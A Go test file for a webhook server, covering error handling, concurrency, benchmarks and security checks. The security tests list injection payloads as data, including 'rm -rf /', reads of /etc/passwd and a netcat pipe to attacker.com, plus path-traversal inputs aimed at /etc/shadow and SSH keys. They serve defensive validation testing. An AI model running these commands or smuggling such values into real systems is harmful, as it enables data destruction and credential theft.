package server

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/soulteary/webhook/internal/flags"
	"github.com/soulteary/webhook/internal/hook"
	"github.com/soulteary/webhook/internal/rules"
	"github.com/soulteary/webhook/internal/security"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ============================================================================
// 错误路径测试
// ============================================================================

// TestMakeSureCallable_FileNotExists 测试文件不存在的情况
func TestMakeSureCallable_FileNotExists(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	h := &hook.Hook{
		ExecuteCommand:          "/nonexistent/path/to/script.sh",
		CommandWorkingDirectory: "",
	}

	r := &hook.Request{
		ID: "test-request",
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}
	cmdPath, err := makeSureCallable(context.Background(), h, r, appFlags, nil)
	assert.Error(t, err)
	assert.Empty(t, cmdPath)
	assert.Contains(t, err.Error(), "no such file")
}

// TestMakeSureCallable_WorkingDirectoryNotExists 测试工作目录不存在的情况
func TestMakeSureCallable_WorkingDirectoryNotExists(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "test-script.sh")
	scriptContent := "#!/bin/sh\necho 'test'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	h := &hook.Hook{
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: "/nonexistent/working/directory",
	}

	r := &hook.Request{
		ID: "test-request",
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}
	cmdPath, err := makeSureCallable(context.Background(), h, r, appFlags, nil)
	// 工作目录不存在时，命令仍然可以执行（只是工作目录设置会失败）
	// 实际行为取决于 exec.Command 的实现
	_ = cmdPath
	_ = err
}

// TestHandleHook_InvalidWorkingDirectory 测试无效工作目录
func TestHandleHook_InvalidWorkingDirectory(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "test-script.sh")
	scriptContent := "#!/bin/sh\necho 'test output'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	h := &hook.Hook{
		ID:                      "test-hook",
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: "/nonexistent/directory",
		CaptureCommandOutput:    true,
	}

	r := &hook.Request{
		ID: "test-request",
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}
	output, err := handleHook(context.Background(), h, r, nil, appFlags)
	// 工作目录不存在时，命令执行可能会失败
	_ = output
	_ = err
}

// TestCreateHookHandler_ConfigFileError 测试配置文件错误
func TestCreateHookHandler_ConfigFileError(t *testing.T) {
	// 设置一个无效的 hook 配置
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"invalid.json": {
			{
				ID: "invalid-hook",
				// 缺少必要的字段，可能导致错误
			},
		},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	req := httptest.NewRequest("POST", "/hooks/invalid-hook", nil)

	app := testHookApp(handler)
	resp, err := app.Test(req, 5000)
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)
}

// TestHandleHook_CommandTimeout 测试命令超时
func TestHandleHook_CommandTimeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "sleep-script.sh")
	// 创建一个会长时间运行的脚本
	scriptContent := "#!/bin/sh\nsleep 10\necho 'done'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	h := &hook.Hook{
		ID:                      "test-hook",
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		CaptureCommandOutput:    true,
	}

	r := &hook.Request{
		ID: "test-request",
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	output, err := handleHook(ctx, h, r, nil, appFlags)
	// 应该因为超时而失败
	assert.Error(t, err)
	assert.True(t, strings.Contains(err.Error(), "context deadline exceeded") || strings.Contains(err.Error(), "timeout"))
	_ = output
}

// ============================================================================
// 并发场景测试
// ============================================================================

// TestConcurrentHookExecution_SameHook 测试多个请求同时触发同一个 hook
func TestConcurrentHookExecution_SameHook(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "test-script.sh")
	scriptContent := "#!/bin/sh\necho 'test output'\nsleep 0.1\necho 'done'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	testHook := hook.Hook{
		ID:                      "concurrent-hook",
		HTTPMethods:             []string{},
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		ResponseMessage:         "success",
	}
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": {testHook},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	numRequests := 10
	var wg sync.WaitGroup
	results := make(chan int, numRequests)

	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			req := httptest.NewRequest("POST", "/hooks/concurrent-hook", nil)
			resp, err := app.Test(req, 5000)
			if err != nil {
				results <- 0
				return
			}
			defer resp.Body.Close()
			results <- resp.StatusCode
		}(i)
	}

	wg.Wait()
	close(results)

	// 验证所有请求都成功
	successCount := 0
	for code := range results {
		if code == http.StatusOK || code == 200 {
			successCount++
		}
	}

	// 所有请求应该都成功（或至少大部分成功）
	assert.Greater(t, successCount, numRequests/2, "至少一半的请求应该成功")
}

// TestConcurrentHookExecution_FileOperations 测试并发文件操作
func TestConcurrentHookExecution_FileOperations(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "file-script.sh")
	// 创建一个会创建文件的脚本
	scriptContent := "#!/bin/sh\necho $1 > /tmp/test-file-$$.txt\necho 'file created'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	testHook := hook.Hook{
		ID:                      "file-hook",
		HTTPMethods:             []string{},
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		PassArgumentsToCommand: []hook.Argument{
			{Source: "header", Name: "X-Data"},
		},
		ResponseMessage: "success",
	}
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": {testHook},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	numRequests := 5
	var wg sync.WaitGroup
	errors := make(chan error, numRequests)

	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			req := httptest.NewRequest("POST", "/hooks/file-hook", nil)
			req.Header.Set("X-Data", "data-"+strconv.Itoa(id))
			resp, err := app.Test(req, 5000)
			if err != nil {
				errors <- err
				return
			}
			defer resp.Body.Close()
			if resp.StatusCode != http.StatusOK {
				errors <- assert.AnError
			}
		}(i)
	}

	wg.Wait()
	close(errors)

	// 验证没有太多错误
	errorCount := len(errors)
	assert.Less(t, errorCount, numRequests/2, "错误数量应该少于请求总数的一半")
}

// TestConcurrentHookExecution_ResourceContention 测试资源竞争
func TestConcurrentHookExecution_ResourceContention(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "resource-script.sh")
	// 创建一个会访问共享资源的脚本
	scriptContent := "#!/bin/sh\ncounter_file='/tmp/webhook-test-counter'\nif [ ! -f $counter_file ]; then echo 0 > $counter_file; fi\ncounter=$(cat $counter_file)\ncounter=$((counter + 1))\necho $counter > $counter_file\necho 'updated'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	testHook := hook.Hook{
		ID:                      "resource-hook",
		HTTPMethods:             []string{},
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		ResponseMessage:         "success",
	}
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": {testHook},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	counterFile := "/tmp/webhook-test-counter"
	os.Remove(counterFile)
	defer os.Remove(counterFile)

	numRequests := 20
	var wg sync.WaitGroup

	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req := httptest.NewRequest("POST", "/hooks/resource-hook", nil)
			resp, _ := app.Test(req, 5000)
			if resp != nil {
				resp.Body.Close()
			}
		}()
	}

	wg.Wait()

	// 验证系统仍然稳定
	// 这里主要测试系统不会崩溃或死锁
}

// ============================================================================
// 安全相关测试
// ============================================================================

// TestCommandInjection_Prevention 测试命令注入防护
func TestCommandInjection_Prevention(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "safe-script.sh")
	scriptContent := "#!/bin/sh\necho 'safe script'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	// 测试各种命令注入尝试
	injectionAttempts := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& ls -la",
		"`whoami`",
		"$(id)",
		"; echo 'injected'",
		"| nc attacker.com 1234",
	}

	for _, injection := range injectionAttempts {
		t.Run("injection_"+strings.ReplaceAll(injection, " ", "_"), func(t *testing.T) {
			testHook := hook.Hook{
				ID:                      "safe-hook",
				HTTPMethods:             []string{},
				ExecuteCommand:          scriptPath,
				CommandWorkingDirectory: tempDir,
				PassArgumentsToCommand: []hook.Argument{
					{Source: "header", Name: "X-Input"},
				},
				ResponseMessage: "success",
			}
			rules.LoadedHooksFromFiles = map[string]hook.Hooks{
				"test.json": {testHook},
			}
			rules.BuildIndex()

			// 创建命令验证器（启用严格模式）
			validator := security.NewCommandValidator()
			validator.StrictMode = true
			appFlags := flags.AppFlags{}

			handler := createHookHandler(appFlags, nil)
			req := httptest.NewRequest("POST", "/hooks/safe-hook", nil)
			req.Header.Set("X-Input", injection)

			app := testHookApp(handler)
			resp, _ := app.Test(req, 5000)
			if resp != nil {
				defer resp.Body.Close()
				_ = resp.StatusCode
			}
		})
	}
}

// TestPathTraversal_Prevention 测试路径遍历防护
func TestPathTraversal_Prevention(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "test-script.sh")
	scriptContent := "#!/bin/sh\necho 'test'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	// 测试各种路径遍历尝试
	pathTraversalAttempts := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"../../../../root/.ssh/id_rsa",
		"/etc/passwd",
		"../../../../etc/shadow",
	}

	for _, path := range pathTraversalAttempts {
		t.Run("path_"+strings.ReplaceAll(path, "/", "_"), func(t *testing.T) {
			// 尝试使用路径遍历来指定命令路径
			h := &hook.Hook{
				ID:                      "path-hook",
				ExecuteCommand:          path,
				CommandWorkingDirectory: tempDir,
			}

			r := &hook.Request{
				ID: "test-request",
			}

			// 创建带白名单的验证器
			validator := security.NewCommandValidator()
			validator.AllowedPaths = []string{tempDir}

			appFlags := flags.AppFlags{AllowAutoChmod: false}
			cmdPath, err := makeSureCallable(context.Background(), h, r, appFlags, validator)

			// 路径遍历应该被拒绝
			if strings.Contains(path, "..") || !strings.HasPrefix(path, tempDir) {
				assert.Error(t, err, "路径遍历应该被拒绝")
				assert.Empty(t, cmdPath)
			}
		})
	}
}

// TestCommandValidator_StrictMode 测试严格模式下的安全验证
func TestCommandValidator_StrictMode(t *testing.T) {
	validator := security.NewCommandValidator()
	validator.StrictMode = true

	// 测试危险字符
	dangerousArgs := []string{
		"test; rm -rf /",
		"test | cat /etc/passwd",
		"test && ls -la",
		"test`whoami`",
		"test$(id)",
		"test\nrm -rf /",
		"test$HOME",
		"test${PATH}",
	}

	for _, arg := range dangerousArgs {
		t.Run("dangerous_"+strings.ReplaceAll(arg, " ", "_"), func(t *testing.T) {
			err := validator.ValidateArgs([]string{"safe-command", arg})
			assert.Error(t, err, "危险字符应该被拒绝")
			assert.Contains(t, err.Error(), "dangerous")
		})
	}

	// 测试安全参数
	safeArgs := []string{
		"test",
		"test-123",
		"test_file.txt",
		"test/path/to/file",
	}

	for _, arg := range safeArgs {
		t.Run("safe_"+arg, func(t *testing.T) {
			err := validator.ValidateArgs([]string{"safe-command", arg})
			assert.NoError(t, err, "安全参数应该被允许")
		})
	}
}

// TestCommandValidator_PathWhitelist 测试路径白名单
func TestCommandValidator_PathWhitelist(t *testing.T) {
	tempDir := t.TempDir()
	allowedScript := filepath.Join(tempDir, "allowed.sh")
	disallowedScript := "/tmp/disallowed.sh"

	validator := security.NewCommandValidator()
	validator.AllowedPaths = []string{tempDir}

	// 测试允许的路径
	err := validator.ValidateCommandPath(allowedScript)
	assert.NoError(t, err, "白名单中的路径应该被允许")

	// 测试不允许的路径
	err = validator.ValidateCommandPath(disallowedScript)
	assert.Error(t, err, "白名单外的路径应该被拒绝")
	assert.Contains(t, err.Error(), "whitelist")
}

// TestCommandValidator_ArgLengthLimits 测试参数长度限制
func TestCommandValidator_ArgLengthLimits(t *testing.T) {
	validator := security.NewCommandValidator()
	validator.MaxArgLength = 100
	validator.MaxTotalArgsLength = 200
	validator.MaxArgsCount = 10

	// 测试单个参数过长
	longArg := strings.Repeat("a", 101)
	err := validator.ValidateArgs([]string{"cmd", longArg})
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "exceeds maximum length")

	// 测试总长度过长
	args := []string{"cmd"}
	for i := 0; i < 5; i++ {
		args = append(args, strings.Repeat("a", 50))
	}
	err = validator.ValidateArgs(args)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "total arguments length")

	// 测试参数数量过多
	tooManyArgs := make([]string, 11)
	for i := range tooManyArgs {
		tooManyArgs[i] = "arg"
	}
	err = validator.ValidateArgs(tooManyArgs)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too many arguments")
}

// TestSpecialCharacters_Handling 测试特殊字符处理
func TestSpecialCharacters_Handling(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "test-script.sh")
	scriptContent := "#!/bin/sh\necho $1\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	// 测试包含特殊字符的参数
	specialChars := []string{
		"test with spaces",
		"test\"quotes\"",
		"test'quotes'",
		"test\nnewline",
		"test\ttab",
	}

	for _, special := range specialChars {
		t.Run("special_"+strings.ReplaceAll(special, " ", "_"), func(t *testing.T) {
			h := &hook.Hook{
				ID:                      "special-hook",
				ExecuteCommand:          scriptPath,
				CommandWorkingDirectory: tempDir,
				PassArgumentsToCommand: []hook.Argument{
					{Source: "header", Name: "X-Input"},
				},
			}

			r := &hook.Request{
				ID:      "test-request",
				Headers: map[string]interface{}{"X-Input": special},
			}

			args, errs := h.ExtractCommandArguments(r)

			// 应该能够提取参数（即使包含特殊字符）
			// 实际的执行安全性取决于 exec.Command 的使用方式
			assert.NotEmpty(t, args)
			_ = errs
		})
	}
}

// ============================================================================
// 性能测试
// ============================================================================

// BenchmarkHookExecution 基准测试单个 hook 执行
func BenchmarkHookExecution(b *testing.B) {
	if runtime.GOOS == "windows" {
		b.Skip("Skipping on Windows")
	}

	tempDir := b.TempDir()
	scriptPath := filepath.Join(tempDir, "bench-script.sh")
	scriptContent := "#!/bin/sh\necho 'benchmark'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(b, err)

	h := &hook.Hook{
		ID:                      "bench-hook",
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		CaptureCommandOutput:    true,
	}

	r := &hook.Request{
		ID: "bench-request",
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = handleHook(context.Background(), h, r, nil, appFlags)
	}
}

// BenchmarkConcurrentHookExecution 基准测试并发 hook 执行
func BenchmarkConcurrentHookExecution(b *testing.B) {
	if runtime.GOOS == "windows" {
		b.Skip("Skipping on Windows")
	}

	tempDir := b.TempDir()
	scriptPath := filepath.Join(tempDir, "bench-script.sh")
	scriptContent := "#!/bin/sh\necho 'benchmark'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(b, err)

	testHook := hook.Hook{
		ID:                      "bench-hook",
		HTTPMethods:             []string{},
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		ResponseMessage:         "success",
	}
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": {testHook},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			req := httptest.NewRequest("POST", "/hooks/bench-hook", nil)
			resp, err := app.Test(req, 5000)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}
	})
}

// TestLoadTest_MultipleHooks 负载测试：多个不同的 hook
func TestLoadTest_MultipleHooks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	numHooks := 5
	hooks := make(hook.Hooks, numHooks)

	for i := 0; i < numHooks; i++ {
		hookID := strconv.Itoa(i)
		scriptPath := filepath.Join(tempDir, "script-"+hookID+".sh")
		scriptContent := "#!/bin/sh\necho 'hook-" + hookID + "'\n"
		err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
		require.NoError(t, err)

		hooks[i] = hook.Hook{
			ID:                      "hook-" + hookID,
			HTTPMethods:             []string{},
			ExecuteCommand:          scriptPath,
			CommandWorkingDirectory: tempDir,
			ResponseMessage:         "success",
		}
	}

	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": hooks,
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	requestsPerHook := 10
	var wg sync.WaitGroup
	successCount := 0
	var mu sync.Mutex

	for i := 0; i < numHooks; i++ {
		for j := 0; j < requestsPerHook; j++ {
			wg.Add(1)
			go func(hookID string) {
				defer wg.Done()
				req := httptest.NewRequest("POST", "/hooks/"+hookID, nil)
				resp, err := app.Test(req, 5000)
				if err != nil {
					return
				}
				defer resp.Body.Close()
				if resp.StatusCode == http.StatusOK {
					mu.Lock()
					successCount++
					mu.Unlock()
				}
			}("hook-" + strconv.Itoa(i))
		}
	}

	wg.Wait()

	// 验证大部分请求成功
	totalRequests := numHooks * requestsPerHook
	assert.Greater(t, successCount, totalRequests*8/10, "至少80%的请求应该成功")
}

// TestStressTest_HighConcurrency 压力测试：高并发
func TestStressTest_HighConcurrency(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "stress-script.sh")
	scriptContent := "#!/bin/sh\necho 'stress test'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	testHook := hook.Hook{
		ID:                      "stress-hook",
		HTTPMethods:             []string{},
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		ResponseMessage:         "success",
	}
	rules.LoadedHooksFromFiles = map[string]hook.Hooks{
		"test.json": {testHook},
	}
	rules.BuildIndex()
	appFlags := flags.AppFlags{
		MaxConcurrentHooks: 10, // 限制并发数
	}

	handler := createHookHandler(appFlags, nil)
	app := testHookApp(handler)

	numRequests := 100
	var wg sync.WaitGroup
	results := make(chan int, numRequests)

	startTime := time.Now()
	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req := httptest.NewRequest("POST", "/hooks/stress-hook", nil)
			resp, err := app.Test(req, 5000)
			if err != nil {
				results <- 0
				return
			}
			defer resp.Body.Close()
			results <- resp.StatusCode
		}()
	}

	wg.Wait()
	duration := time.Since(startTime)
	close(results)

	// 统计结果
	successCount := 0
	timeoutCount := 0
	for code := range results {
		if code == http.StatusOK {
			successCount++
		} else if code == http.StatusServiceUnavailable || code == 503 {
			timeoutCount++
		}
	}

	t.Logf("压力测试结果: 总请求数=%d, 成功=%d, 超时/拒绝=%d, 耗时=%v", numRequests, successCount, timeoutCount, duration)

	// 验证系统在高并发下仍然稳定
	assert.Greater(t, successCount, 0, "至少有一些请求应该成功")
	// 由于并发限制，一些请求可能会被拒绝或超时，这是正常的
}

// TestMemoryLeak_RepeatedExecutions 测试内存泄漏：重复执行
func TestMemoryLeak_RepeatedExecutions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	tempDir := t.TempDir()
	scriptPath := filepath.Join(tempDir, "leak-script.sh")
	scriptContent := "#!/bin/sh\necho 'memory test'\n"
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	require.NoError(t, err)

	h := &hook.Hook{
		ID:                      "leak-hook",
		ExecuteCommand:          scriptPath,
		CommandWorkingDirectory: tempDir,
		CaptureCommandOutput:    true,
	}

	appFlags := flags.AppFlags{AllowAutoChmod: false}

	// 执行大量请求
	numExecutions := 1000
	for i := 0; i < numExecutions; i++ {
		r := &hook.Request{
			ID: "request-" + strconv.Itoa(i%10),
		}
		_, err := handleHook(context.Background(), h, r, nil, appFlags)
		assert.NoError(t, err, "执行 %d 应该成功", i)
	}

	// 这里主要验证不会崩溃或内存泄漏
	// 实际的内存检查需要使用专门的工具
}

// ============================================================================
// 辅助函数和工具
// ============================================================================
// 注意：errorReader 已在 webhook_test.go 中定义，这里不再重复定义
